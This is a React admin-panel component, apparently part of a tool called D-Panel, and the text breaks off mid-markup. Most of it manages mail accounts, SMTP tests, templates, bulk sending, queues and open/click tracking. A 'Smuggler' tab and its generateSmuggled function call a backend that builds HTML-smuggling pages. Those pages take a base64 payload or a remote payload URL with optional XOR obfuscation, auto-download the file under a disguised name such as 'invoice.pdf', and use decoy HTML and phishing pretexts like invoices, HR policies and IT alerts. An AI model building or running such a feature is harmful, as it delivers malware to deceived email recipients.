"use client"
import { apiFetch } from "@/lib/api/fetch"

import { useCallback, useEffect, useState } from "react"
import { toast } from "sonner"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Switch } from "@/components/ui/switch"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { cn } from "@/lib/utils"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { SmtpConfigManager, type SmtpConfigItem } from "./smtp-config-manager"

/* ------------------------------------------------------------------ */
/*  Types (client-side mirrors of server types)                       */
/* ------------------------------------------------------------------ */

type SafeMailAccount = {
  id: string
  protocol: "imap" | "pop3"
  host: string
  port: number
  secure: boolean
  user: string
  mailbox: string
  label?: string
}

type MailTestResult = {
  accountId: string
  label: string | null
  protocol: string
  status: "pass" | "fail"
  latencyMs: number
  messageCount?: number
  error?: string
  testedAt: string
}

type AutoTestState = {
  enabled: boolean
  intervalMinutes: number
  lastRun: string | null
  nextRun: string | null
  results: MailTestResult[]
}

type MailMessage = {
  uid: number | string
  subject: string | null
  from: string | null
  to: string | null
  date: string | null
  attachments: Array<{ filename: string; size: number; contentType: string }>
}

/* ------------------------------------------------------------------ */
/*  Component                                                         */
/* ------------------------------------------------------------------ */

export function MailTestView() {
  const [accounts, setAccounts] = useState<SafeMailAccount[]>([])
  const [autoState, setAutoState] = useState<AutoTestState | null>(null)
  const [loading, setLoading] = useState(true)
  const [testingAll, setTestingAll] = useState(false)
  const [testingSingle, setTestingSingle] = useState<string | null>(null)
  const [selectedAccount, setSelectedAccount] = useState<string | null>(null)
  const [messages, setMessages] = useState<MailMessage[]>([])
  const [loadingMessages, setLoadingMessages] = useState(false)

  // SMTP test form
  const [smtpHost, setSmtpHost] = useState("")
  const [smtpPort, setSmtpPort] = useState("587")
  const [smtpSecure, setSmtpSecure] = useState(false)
  const [smtpUser, setSmtpUser] = useState("")
  const [smtpPass, setSmtpPass] = useState("")
  const [smtpFrom, setSmtpFrom] = useState("")
  const [sendTo, setSendTo] = useState("")
  const [sendSubject, setSendSubject] = useState("D-Panel Mail Test")
  const [sendBody, setSendBody] = useState(
    "This is an automated test message from D-Panel.",
  )
  const [sendingTest, setSendingTest] = useState(false)

  // Saved SMTP configs
  const [smtpConfigs, setSmtpConfigs] = useState<SmtpConfigItem[]>([])
  const [selectedSmtpConfigId, setSelectedSmtpConfigId] = useState<string>("")
  const [loadingSmtpConfigs, setLoadingSmtpConfigs] = useState(false)

  // Resend email test state
  const [resendTo, setResendTo] = useState("")
  const [resendSubject, setResendSubject] = useState("D-Panel Resend Test")
  const [resendBody, setResendBody] = useState(
    "This is an automated test message from D-Panel via Resend.",
  )
  const [sendingResend, setSendingResend] = useState(false)

  // Bulk email send state
  const [bulkCsvText, setBulkCsvText] = useState("")
  const [bulkSubject, setBulkSubject] = useState("Hello {{firstName}}")
  const [bulkBody, setBulkBody] = useState(
    "Hi {{name}},\n\nThis is a personalized message for you.\n\nBest regards,\nD-Panel"
  )
  const [bulkHtmlBody, setBulkHtmlBody] = useState("")
  const [bulkProvider, setBulkProvider] = useState<"smtp" | "resend" | "mysmtp">("smtp")
  const [bulkSmtpConfigId, setBulkSmtpConfigId] = useState("")
  const [bulkRateLimit, setBulkRateLimit] = useState("60")
  const [bulkBatchSize, setBulkBatchSize] = useState("10")
  const [bulkDelayMs, setBulkDelayMs] = useState("1000")
  const [bulkSending, setBulkSending] = useState(false)
  const [bulkDryRunResult, setBulkDryRunResult] = useState<any>(null)
  const [bulkSendResult, setBulkSendResult] = useState<any>(null)

  // Auto-test interval form
  const [intervalInput, setIntervalInput] = useState("30")

  // Template editor state
  const [activeTab, setActiveTab] = useState("accounts")
  const [templates, setTemplates] = useState<Array<{id: string; name: string; subject: string; htmlContent: string; textContent: string; variables?: string[]; category?: string; version?: number; tags?: string[]; description?: string}>>([])
  const [selectedTemplate, setSelectedTemplate] = useState<{id: string; name: string; subject: string; htmlContent: string; textContent: string; variables?: string[]; category?: string; version?: number; tags?: string[]; description?: string} | null>(null)
  const [templateName, setTemplateName] = useState("")
  const [templateSubject, setTemplateSubject] = useState("")
  const [templateHtml, setTemplateHtml] = useState("")
  const [templateText, setTemplateText] = useState("")
  const [templateVariables, setTemplateVariables] = useState<string[]>([])
  const [templateCategory, setTemplateCategory] = useState("general")
  const [templateDescription, setTemplateDescription] = useState("")
  const [templateTags, setTemplateTags] = useState<string[]>([])
  const [templateTagInput, setTemplateTagInput] = useState("")
  const [showPreview, setShowPreview] = useState(false)
  const [previewVariables, setPreviewVariables] = useState<Record<string, string>>({})
  const [previewHtml, setPreviewHtml] = useState("")
  const [templateVersions, setTemplateVersions] = useState<Array<{id: string; version: number; createdAt: string; changelog?: string}>>([])
  const [showVersions, setShowVersions] = useState(false)

  // Attachment manager state
  const [attachments, setAttachments] = useState<Array<{id: string; filename: string; size: number; contentType: string}>>([])

  // Tracking configuration state
  const [trackingEnabled, setTrackingEnabled] = useState(false)
  const [trackingDomain, setTrackingDomain] = useState("")
  const [trackOpens, setTrackOpens] = useState(true)
  const [trackClicks, setTrackClicks] = useState(true)

  // Campaign management state
  const [campaignId, setCampaignId] = useState("")
  const [campaigns, setCampaigns] = useState<Array<{id: string; name: string; status: string}>>([])

  // Analytics dashboard state
  const [analytics, setAnalytics] = useState<{openRate: number; clickRate: number; totalOpens: number; totalClicks: number} | null>(null)

  // Queue state
  const [queueStats, setQueueStats] = useState<{pending: number; processing: number; sent: number; failed: number; total: number} | null>(null)
  const [queueEmails, setQueueEmails] = useState<Array<{id: string; to: string; subject: string; status: string; error?: string}>>([])
  const [queueConfig, setQueueConfig] = useState<{maxConcurrent: number; rateLimitPerMinute: number; retryAttempts: number; retryDelayMs: number} | null>(null)

  // Tracking state
  const [trackingEvents, setTrackingEvents] = useState<Array<{id: string; recipient: string; type: string; timestamp: string}>>([])

  // Bounce state
  const [bounceEvents, setBounceEvents] = useState<Array<{id: string; recipient: string; bounceReason: string; bounceType: string; timestamp: string}>>([])
  const [bounceStats, setBounceStats] = useState<{total: number; hard: number; soft: number; complaints: number; unknown: number} | null>(null)
  const [suppressedEmails, setSuppressedEmails] = useState<string[]>([])

  // Smuggler state
  const [smugMode, setSmugMode] = useState<"embed" | "staged" | "pretext-only">("embed")
  const [smugPayloadB64, setSmugPayloadB64] = useState("")
  const [smugPayloadUrl, setSmugPayloadUrl] = useState("")
  const [smugFilename, setSmugFilename] = useState("invoice.pdf")
  const [smugPretext, setSmugPretext] = useState<"invoice" | "hr_policy" | "it_alert" | "contract" | "">("")
  const [smugXorKey, setSmugXorKey] = useState("")
  const [smugAutoDownload, setSmugAutoDownload] = useState(true)
  const [smugLinkText, setSmugLinkText] = useState("")
  const [smugDecoyHtml, setSmugDecoyHtml] = useState("")
  const [smugResult, setSmugResult] = useState<{html: string; sizeBytes: number; mode: string} | null>(null)
  const [smugLoading, setSmugLoading] = useState(false)

  const generateSmuggled = useCallback(async () => {
    setSmugLoading(true)
    setSmugResult(null)
    try {
      const body: Record<string, unknown> = { mode: smugMode }
      if (smugMode === "embed") {
        if (!smugPayloadB64.trim()) { toast.error("Paste a base64 payload"); return }
        body.payloadBase64 = smugPayloadB64.trim()
        body.filename = smugFilename.trim() || "attachment.bin"
        body.autoDownload = smugAutoDownload
        if (smugPretext) body.pretext = smugPretext
        if (smugXorKey) body.xorKey = parseInt(smugXorKey, 10)
        if (smugLinkText) body.downloadLinkText = smugLinkText
        if (smugDecoyHtml) body.decoyHtml = smugDecoyHtml
      } else if (smugMode === "staged") {
        if (!smugPayloadUrl.trim()) { toast.error("Enter payload URL"); return }
        body.payloadUrl = smugPayloadUrl.trim()
        body.filename = smugFilename.trim() || "attachment.bin"
        body.autoDownload = smugAutoDownload
        if (smugPretext) body.pretext = smugPretext
        if (smugLinkText) body.downloadLinkText = smugLinkText
        if (smugDecoyHtml) body.decoyHtml = smugDecoyHtml
      } else {
        if (!smugPretext) { toast.error("Select a pretext template"); return }
        body.pretext = smugPretext
      }
      const res = await apiFetch("/api/admin/communication/mail/smuggler", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(body),
      })
      if (!res.ok) {
        const err = await res.json().catch(() => ({ error: res.statusText }))
        throw new Error(err.error || "Failed")
      }
      const data = await res.json()
      setSmugResult(data)
      toast.success("HTML generated", { description: `${(data.sizeBytes / 1024).toFixed(1)} KB` })
    } catch (err) {
      toast.error("Smuggler failed", { description: err instanceof Error ? err.message : "unknown" })
    } finally {
      setSmugLoading(false)
    }
  }, [smugMode, smugPayloadB64, smugPayloadUrl, smugFilename, smugPretext, smugXorKey, smugAutoDownload, smugLinkText, smugDecoyHtml])

  /* ---- Test all accounts ---- */
  const testAll = useCallback(async () => {
    setTestingAll(true)
    try {
      const res = await apiFetch("/api/admin/communication/mail/test-all", {
        method: "POST",
        cache: "no-store",
      })
      if (!res.ok) throw new Error(`${res.status}`)
      const data = await res.json()
      setAutoState((prev) =>
        prev
          ? { ...prev, results: data.results, lastRun: new Date().toISOString() }
          : { enabled: false, intervalMinutes: 30, lastRun: new Date().toISOString(), nextRun: null, results: data.results },
      )
      const passed = (data.results as MailTestResult[]).filter((r) => r.status === "pass").length
      toast.success(`Tested ${data.results.length} accounts`, {
        description: `${passed} passed, ${data.results.length - passed} failed`,
      })
    } catch (err) {
      toast.error("Test-all failed", {
        description: err instanceof Error ? err.message : "unknown",
      })
    } finally {
      setTestingAll(false)
    }
  }, [])

  /* ---- Test single account ---- */
  const testSingle = useCallback(async (id: string) => {
    setTestingSingle(id)
    try {
      const res = await apiFetch(`/api/admin/communication/mail/accounts/${id}/test`, {
        method: "POST",
        cache: "no-store",
      })
      if (!res.ok) throw new Error(`${res.status}`)
      const data = await res.json()
      toast.success(`Account ${id}: connected`, {
        description: `${data.count ?? 0} messages in mailbox`,
      })
    } catch (err) {
      toast.error(`Account ${id}: failed`, {
        description: err instanceof Error ? err.message : "unknown",
      })
    } finally {
      setTestingSingle(null)
    }
  }, [])

  /* ---- Load messages for an account ---- */
  const loadMessages = useCallback(async (id: string) => {
    setSelectedAccount(id)
    setLoadingMessages(true)
    try {
      const res = await apiFetch(`/api/admin/communication/mail/accounts/${id}/messages?limit=20`, {
        cache: "no-store",
      })
      if (!res.ok) throw new Error(`${res.status}`)
      const data = await res.json()
      setMessages(data.messages ?? [])
    } catch (err) {
      toast.error("Failed to load messages", {
        description: err instanceof Error ? err.message : "unknown",
      })
      setMessages([])
    } finally {
      setLoadingMessages(false)
    }
  }, [])

  /* ---- Auto-test controls ---- */
  const toggleAutoTest = useCallback(
    async (action: "enable" | "disable") => {
      try {
        const res = await apiFetch("/api/admin/communication/mail/auto-test", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            action,
            intervalMinutes: action === "enable" ? Number(intervalInput) || 30 : undefined,
          }),
        })
        if (!res.ok) throw new Error(`${res.status}`)
        const data = await res.json()
        setAutoState(data)
        toast.success(action === "enable" ? "Auto-test enabled" : "Auto-test disabled")
      } catch (err) {
        toast.error("Failed to update auto-test", {
          description: err instanceof Error ? err.message : "unknown",
        })
      }
    },
    [intervalInput],
  )

  /* ---- Load saved SMTP configs ---- */
  const loadSmtpConfigsList = useCallback(async () => {
    setLoadingSmtpConfigs(true)
    try {
      const res = await apiFetch("/api/admin/communication/mail/smtp-configs", { cache: "no-store" })
      if (res.ok) {
        const data = await res.json()
        setSmtpConfigs(data.configs ?? [])
      }
    } catch {
      // silently fail, not critical
    } finally {
      setLoadingSmtpConfigs(false)
    }
  }, [])

  /* ---- Send test email ---- */
  const handleSendTest = useCallback(async () => {
    setSendingTest(true)
    try {
      let body: Record<string, unknown>
      if (selectedSmtpConfigId) {
        body = {
          configId: selectedSmtpConfigId,
          to: sendTo,
          subject: sendSubject,
          body: sendBody,
        }
      } else {
        body = {
          smtp: {
            host: smtpHost,
            port: Number(smtpPort) || 587,
            secure: smtpSecure,
            user: smtpUser,
            password: smtpPass,
            from: smtpFrom || undefined,
          },
          to: sendTo,
          subject: sendSubject,
          body: sendBody,
        }
      }

      const res = await apiFetch("/api/admin/communication/mail/send-test", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(body),
      })
      if (!res.ok) {
        const errData = await res.json().catch(() => ({}))
        throw new Error((errData as { error?: string }).error ?? `${res.status}`)
      }
      const data = await res.json()
      toast.success("Test email sent", {
        description: `Message ID: ${(data as { messageId?: string }).messageId ?? "unknown"}`,
      })
    } catch (err) {
      toast.error("Send failed", {
        description: err instanceof Error ? err.message : "unknown",
      })
    } finally {
      setSendingTest(false)
    }
  }, [selectedSmtpConfigId, smtpHost, smtpPort, smtpSecure, smtpUser, smtpPass, smtpFrom, sendTo, sendSubject, sendBody])

  /* ---- Send Resend test email ---- */
  const handleSendResend = useCallback(async () => {
    setSendingResend(true)
    try {
      const res = await apiFetch("/api/admin/communication/mail/resend/send", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          to: resendTo,
          subject: resendSubject,
          html: `<div style="font-family:sans-serif;padding:20px;">
            <h2 style="color:#333;">D-Panel Resend Test</h2>
            <p>${resendBody}</p>
            <hr style="border:none;border-top:1px solid #eee;margin:16px 0;" />
            <p style="color:#999;font-size:12px;">
              Sent at ${new Date().toISOString()} by D-Panel via Resend
            </p>
          </div>`,
          text: resendBody,
          type: "notification",
        }),
      })
      if (!res.ok) {
        const errData = await res.json().catch(() => ({}))
        throw new Error((errData as { error?: string }).error ?? `${res.status}`)
      }
      const data = await res.json()
      toast.success("Resend email sent", {
        description: `Message ID: ${data.messageId ?? "unknown"}`,
      })
    } catch (err) {
      toast.error("Resend send failed", {
        description: err instanceof Error ? err.message : "unknown",
      })
    } finally {
      setSendingResend(false)
    }
  }, [resendTo, resendSubject, resendBody])

  /* ---- Bulk email send ---- */
  const handleBulkDryRun = useCallback(async () => {
    if (!bulkCsvText.trim()) {
      toast.error("Please paste CSV content")
      return
    }
    setBulkSending(true)
    setBulkDryRunResult(null)
    setBulkSendResult(null)
    try {
      const res = await apiFetch("/api/admin/communication/mail/bulk-send", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          csvContent: bulkCsvText,
          subject: bulkSubject,
          body: bulkBody,
          htmlBody: bulkHtmlBody || undefined,
          provider: bulkProvider,
          smtpConfigId: bulkSmtpConfigId || undefined,
          rateLimitPerMinute: Number(bulkRateLimit) || 60,
          batchSize: Number(bulkBatchSize) || 10,
          delayMs: Number(bulkDelayMs) || 1000,
          dryRun: true,
        }),
      })
      if (!res.ok) {
        const errData = await res.json().catch(() => ({}))
        throw new Error((errData as { error?: string }).error ?? `${res.status}`)
      }
      const data = await res.json()
      setBulkDryRunResult(data)
      toast.success("Dry run complete", {
        description: `${data.summary.validEmails} valid, ${data.summary.invalidEmails} invalid`,
      })
    } catch (err) {
      toast.error("Dry run failed", {
        description: err instanceof Error ? err.message : "unknown",
      })
    } finally {
      setBulkSending(false)
    }
  }, [bulkCsvText, bulkSubject, bulkBody, bulkHtmlBody, bulkProvider, bulkSmtpConfigId, bulkRateLimit, bulkBatchSize, bulkDelayMs])

  const handleBulkSend = useCallback(async () => {
    if (!bulkCsvText.trim()) {
      toast.error("Please paste CSV content")
      return
    }
    if (!confirm(`Send emails to ${bulkDryRunResult?.summary?.validEmails ?? "?"} recipients?`)) {
      return
    }
    setBulkSending(true)
    setBulkSendResult(null)
    try {
      const res = await apiFetch("/api/admin/communication/mail/bulk-send", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          csvContent: bulkCsvText,
          subject: bulkSubject,
          body: bulkBody,
          htmlBody: bulkHtmlBody || undefined,
          provider: bulkProvider,
          smtpConfigId: bulkSmtpConfigId || undefined,
          rateLimitPerMinute: Number(bulkRateLimit) || 60,
          batchSize: Number(bulkBatchSize) || 10,
          delayMs: Number(bulkDelayMs) || 1000,
          dryRun: false,
        }),
      })
      if (!res.ok) {
        const errData = await res.json().catch(() => ({}))
        throw new Error((errData as { error?: string }).error ?? `${res.status}`)
      }
      const data = await res.json()
      setBulkSendResult(data)
      toast.success("Bulk email sent", {
        description: `${data.results.emailsSent} sent, ${data.results.emailsFailed} failed`,
      })
    } catch (err) {
      toast.error("Bulk send failed", {
        description: err instanceof Error ? err.message : "unknown",
      })
    } finally {
      setBulkSending(false)
    }
  }, [bulkCsvText, bulkSubject, bulkBody, bulkHtmlBody, bulkProvider, bulkSmtpConfigId, bulkRateLimit, bulkBatchSize, bulkDelayMs, bulkDryRunResult])

  const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    const reader = new FileReader()
    reader.onload = (event) => {
      const text = event.target?.result as string
      setBulkCsvText(text)
      toast.success("CSV loaded", { description: `${file.name} (${(file.size / 1024).toFixed(1)} KB)` })
    }
    reader.readAsText(file)
  }, [])

  /* ---- Helpers ---- */
  const resultForAccount = (id: string): MailTestResult | undefined =>
    autoState?.results.find((r) => r.accountId === id)

  /* ---- Template functions ---- */
  const loadTemplates = useCallback(async () => {
    try {
      const res = await apiFetch("/api/admin/communication/mail/templates", { cache: "no-store" })
      if (res.ok) {
        const data = await res.json()
        setTemplates(data.templates || [])
      }
    } catch {
      toast.error("Failed to load templates")
    }
  }, [])

  const saveTemplate = useCallback(async () => {
    try {
      const res = await apiFetch("/api/admin/communication/mail/templates", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          id: selectedTemplate?.id || `template_${Date.now()}`,
          name: templateName,
          subject: templateSubject,
          htmlContent: templateHtml,
          textContent: templateText,
          variables: templateVariables,
          category: templateCategory,
          description: templateDescription,
          tags: templateTags,
        }),
      })
      if (!res.ok) throw new Error("Failed to save template")
      toast.success("Template saved successfully")
      loadTemplates()
      setSelectedTemplate(null)
      setTemplateName("")
      setTemplateSubject("")
      setTemplateHtml("")
      setTemplateText("")
      setTemplateVariables([])
      setTemplateCategory("general")
      setTemplateDescription("")
      setTemplateTags([])
    } catch {
      toast.error("Failed to save template")
    }
  }, [selectedTemplate, templateName, templateSubject, templateHtml, templateText, templateVariables, templateCategory, templateDescription, templateTags, loadTemplates])

  const deleteTemplate = useCallback(async (id: string) => {
    try {
      const res = await apiFetch(`/api/admin/communication/mail/templates?id=${id}`, {
        method: "DELETE",
      })
      if (!res.ok) throw new Error("Failed to delete template")
      toast.success("Template deleted")
      loadTemplates()
    } catch {
      toast.error("Failed to delete template")
    }
  }, [loadTemplates])

  const extractTemplateVariables = useCallback(async () => {
    try {
      const res = await apiFetch("/api/admin/communication/mail/templates", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          action: "extract-variables",
          htmlContent: templateHtml,
          textContent: templateText,
          subject: templateSubject,
        }),
      })
      if (res.ok) {
        const data = await res.json()
        setTemplateVariables(data.variables || [])
      }
    } catch {
      console.error("Failed to extract variables")
    }
  }, [templateHtml, templateText, templateSubject])

  const loadTemplateVersions = useCallback(async (templateId: string) => {
    try {
      const res = await apiFetch(`/api/admin/communication/mail/templates?id=${templateId}&action=versions`, { cache: "no-store" })
      if (res.ok) {
        const data = await res.json()
        setTemplateVersions(data.versions || [])
      }
    } catch {
      toast.error("Failed to load template versions")
    }
  }, [])

  const previewTemplate = useCallback(async () => {
    try {
      const res = await apiFetch("/api/admin/communication/mail/templates", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          action: "preview-content",
          htmlContent: templateHtml,
          textContent: templateText,
          subject: templateSubject,
          variables: previewVariables,
        }),
      })
      if (res.ok) {
        const data = await res.json()
        setPreviewHtml(data.rendered.htmlContent)
        setShowPreview(true)
      }
    } catch {
      toast.error("Failed to preview template")
    }
  }, [templateHtml, templateText, templateSubject, previewVariables])

  const addTemplateTag = useCallback(() => {
    if (templateTagInput.trim() && !templateTags.includes(templateTagInput.trim())) {
      setTemplateTags([...templateTags, templateTagInput.trim()])
      setTemplateTagInput("")
    }
  }, [templateTagInput, templateTags])

  const removeTemplateTag = useCallback((tag: string) => {
    setTemplateTags(templateTags.filter(t => t !== tag))
  }, [templateTags])

  const handleAttachmentUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    
    const reader = new FileReader()
    reader.onload = (event) => {
      const base64 = event.target?.result as string
      const attachment = {
        id: `att_${Date.now()}`,
        filename: file.name,
        size: file.size,
        contentType: file.type,
        content: base64.split(',')[1], // Remove data URL prefix
      }
      setAttachments([...attachments, attachment])
      toast.success("Attachment added", { description: file.name })
    }
    reader.readAsDataURL(file)
  }, [attachments])

  const removeAttachment = useCallback((id: string) => {
    setAttachments(attachments.filter(a => a.id !== id))
  }, [attachments])

  const loadCampaigns = useCallback(async () => {
    try {
      const res = await apiFetch("/api/admin/communication/mail/campaigns", { cache: "no-store" })
      if (res.ok) {
        const data = await res.json()
        setCampaigns(data.campaigns || [])
      }
    } catch {
      // Silently fail, not critical
    }
  }, [])

  const loadAnalytics = useCallback(async () => {
    try {
      const res = await apiFetch("/api/admin/communication/mail/analytics", { cache: "no-store" })
      if (res.ok) {
        const data = await res.json()
        setAnalytics(data.analytics || null)
      }
    } catch {
      // Silently fail, not critical
    }
  }, [])

  /* ---- Queue functions ---- */
  const loadQueueData = useCallback(async () => {
    try {
      const [statsRes, emailsRes, configRes] = await Promise.all([
        apiFetch("/api/admin/communication/mail/queue?action=stats", { cache: "no-store" }),
        apiFetch("/api/admin/communication/mail/queue", { cache: "no-store" }),
        apiFetch("/api/admin/communication/mail/queue?action=config", { cache: "no-store" }),
      ])
      
      if (statsRes.ok) setQueueStats(await statsRes.json())
      if (emailsRes.ok) {
        const data = await emailsRes.json()
        setQueueEmails(data.emails || [])
      }
      if (configRes.ok) setQueueConfig(await configRes.json())
    } catch {
      toast.error("Failed to load queue data")
    }
  }, [])

  /* ---- Tracking functions ---- */
  const loadTrackingData = useCallback(async () => {
    try {
      const res = await apiFetch("/api/admin/communication/mail/tracking", { cache: "no-store" })
      if (res.ok) {
        const data = await res.json()
        setTrackingEvents(data.events || [])
      }
    } catch {
      toast.error("Failed to load tracking data")
    }
  }, [])

  /* ---- Bounce functions ---- */
  const loadBounceData = useCallback(async () => {
    try {
      const [statsRes, suppressedRes] = await Promise.all([
        apiFetch("/api/admin/communication/mail/bounce?action=stats", { cache: "no-store" }),
        apiFetch("/api/admin/communication/mail/bounce?action=suppressed", { cache: "no-store" }),
      ])
      
      if (statsRes.ok) setBounceStats(await statsRes.json())
      if (suppressedRes.ok) {
        const data = await suppressedRes.json()
        setSuppressedEmails(data.emails || [])
      }
      
      const eventsRes = await apiFetch("/api/admin/communication/mail/bounce", { cache: "no-store" })
      if (eventsRes.ok) {
        const data = await eventsRes.json()
        setBounceEvents(data.events || [])
      }
    } catch {
      toast.error("Failed to load bounce data")
    }
  }, [])

  /* ---- Load data when tab changes ---- */
  useEffect(() => {
    if (activeTab === "queue") {
      // eslint-disable-next-line react-hooks/set-state-in-effect
      loadQueueData()
    } else if (activeTab === "tracking") {
      loadTrackingData()
    } else if (activeTab === "bounce") {
      loadBounceData()
    }
  }, [activeTab, loadQueueData, loadTrackingData, loadBounceData])

  /* ---- Initial data load ---- */
  useEffect(() => {
    async function load() {
      try {
        const [acctRes, stateRes] = await Promise.all([
          apiFetch("/api/admin/communication/mail/accounts", { cache: "no-store" }),
          apiFetch("/api/admin/communication/mail/auto-test", { cache: "no-store" }),
        ])
        if (acctRes.ok) {
          const data = await acctRes.json()
          setAccounts(data.accounts ?? [])
        }
        if (stateRes.ok) {
          const data = await stateRes.json()
          setAutoState(data)
          if (data.intervalMinutes) setIntervalInput(String(data.intervalMinutes))
        }
        loadTemplates()
        loadSmtpConfigsList()
        loadCampaigns()
        loadAnalytics()
      } catch (err) {
        toast.error("Failed to load mail data", {
          description: err instanceof Error ? err.message : "unknown",
        })
      } finally {
        setLoading(false)
      }
    }
    load()
  }, [loadTemplates, loadSmtpConfigsList, loadCampaigns, loadAnalytics])

  if (loading) {
    return (
      <div className="flex flex-col gap-6">
        <div>
          <div className="h-7 w-32 rounded bg-muted animate-pulse" />
          <div className="h-4 w-80 rounded bg-muted animate-pulse mt-2" />
        </div>
        <div className="grid gap-6 xl:grid-cols-2">
          {[...Array(4)].map((_, i) => (
            <div key={i} className="rounded-lg border p-6 space-y-3">
              <div className="h-4 w-40 rounded bg-muted animate-pulse" />
              <div className="h-8 rounded bg-muted animate-pulse" />
              <div className="h-8 rounded bg-muted animate-pulse" />
            </div>
          ))}
        </div>
      </div>
    )
  }

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="text-heading-xl">Mail System</h1>
        <p className="text-sm text-muted-foreground">
          Manage SMTP configs, send campaigns, track delivery, and monitor account health.
        </p>
      </div>

      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="grid w-full grid-cols-8">
          <TabsTrigger value="accounts">Accounts</TabsTrigger>
          <TabsTrigger value="smtp-configs">SMTP Configs</TabsTrigger>
          <TabsTrigger value="templates">Templates</TabsTrigger>
          <TabsTrigger value="queue">Queue</TabsTrigger>
          <TabsTrigger value="tracking">Tracking</TabsTrigger>
          <TabsTrigger value="bounce">Bounce</TabsTrigger>
          <TabsTrigger value="analytics">Analytics</TabsTrigger>
          <TabsTrigger value="smuggler">Smuggler</TabsTrigger>
        </TabsList>

        <TabsContent value="accounts" className="space-y-6">
          <div className="grid gap-6 xl:grid-cols-2">
        {/* ================================================================ */}
        {/*  ACCOUNTS & CONNECTIVITY PANEL                                   */}
        {/* ================================================================ */}
        <Card>
          <CardHeader className="pb-3">
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-sm">Mail Accounts</CardTitle>
                <CardDescription className="text-xs">
                  {accounts.length} configured account{accounts.length !== 1 && "s"}
                </CardDescription>
              </div>
              <Button size="sm" onClick={testAll} disabled={testingAll || accounts.length === 0}>
                {testingAll ? "Testing..." : "Test All"}
              </Button>
            </div>
          </CardHeader>
          <CardContent className="space-y-2 max-h-[440px] overflow-y-auto">
            {accounts.length === 0 ? (
              <p className="text-xs text-muted-foreground">
                No mail accounts configured. Set MAIL_ACCOUNTS_FILE or MAIL_ACCOUNTS_JSON env var.
              </p>
            ) : (
              accounts.map((acct) => {
                const result = resultForAccount(acct.id)
                return (
                  <div
                    key={acct.id}
                    className={cn(
                      "flex items-center justify-between rounded-lg border p-3",
                      selectedAccount === acct.id && "border-primary bg-muted/50",
                    )}
                  >
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="font-medium text-sm truncate">
                          {acct.label ?? acct.user}
                        </span>
                        <Badge variant="secondary" className="text-[10px]">
                          {acct.protocol.toUpperCase()}
                        </Badge>
                        {result && (
                          <Badge
                            variant={result.status === "pass" ? "default" : "destructive"}
                            className="text-[10px]"
                          >
                            {result.status === "pass"
                              ? `OK ${result.latencyMs}ms`
                              : "FAIL"}
                          </Badge>
                        )}
                      </div>
                      <p className="text-xs text-muted-foreground truncate">
                        {acct.host}:{acct.port} &bull; {acct.mailbox}
                        {result?.messageCount !== undefined && ` &bull; ${result.messageCount} msgs`}
                      </p>
                      {result?.error && (
                        <p className="text-xs text-destructive truncate">{result.error}</p>
                      )}
                    </div>
                    <div className="flex gap-1 shrink-0 ml-2">
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => testSingle(acct.id)}
                        disabled={testingSingle === acct.id}
                      >
                        {testingSingle === acct.id ? "..." : "Test"}
                      </Button>
                      <Button
                        size="sm"
                        variant="ghost"
                        onClick={() => loadMessages(acct.id)}
                      >
                        Inbox
                      </Button>
                    </div>
                  </div>
                )
              })
            )}
          </CardContent>
        </Card>

        {/* ================================================================ */}
        {/*  AUTO-TEST SCHEDULER                                             */}
        {/* ================================================================ */}
        <Card>
          <CardHeader className="pb-3">
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-sm">Auto-Test Scheduler</CardTitle>
                <CardDescription className="text-xs">
                  Periodically test all accounts on a timer
                </CardDescription>
              </div>
              <Badge variant={autoState?.enabled ? "default" : "secondary"}>
                {autoState?.enabled ? "Active" : "Inactive"}
              </Badge>
            </div>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="flex items-end gap-3">
              <div className="space-y-1 flex-1">
                <Label className="text-xs">Interval (minutes)</Label>
                <Input
                  type="number"
                  min="1"
                  max="1440"
                  value={intervalInput}
                  onChange={(e) => setIntervalInput(e.target.value)}
                  className="h-8 text-sm"
                />
              </div>
              <Button
                size="sm"
                onClick={() =>
                  toggleAutoTest(autoState?.enabled ? "disable" : "enable")
                }
              >
                {autoState?.enabled ? "Disable" : "Enable"}
              </Button>
              <Button size="sm" variant="outline" onClick={testAll} disabled={testingAll}>
                Run Now
              </Button>
            </div>

            {autoState?.lastRun && (
              <p className="text-xs text-muted-foreground">
                Last run: {new Date(autoState.lastRun).toLocaleString()}
              </p>
            )}
            {autoState?.nextRun && (
              <p className="text-xs text-muted-foreground">
                Next run: {new Date(autoState.nextRun).toLocaleString()}
              </p>
            )}

            {/* Results summary */}
            {autoState && autoState.results.length > 0 && (
              <div className="space-y-1 pt-2 border-t">
                <p className="text-xs font-medium">Last Results</p>
                <div className="grid grid-cols-3 gap-2 text-center">
                  <div className="rounded-md bg-muted p-2">
                    <p className="text-lg font-bold">{autoState.results.length}</p>
                    <p className="text-[10px] text-muted-foreground">Total</p>
                  </div>
                  <div className="rounded-md bg-emerald-500/10 p-2">
                    <p className="text-lg font-bold text-emerald-600">
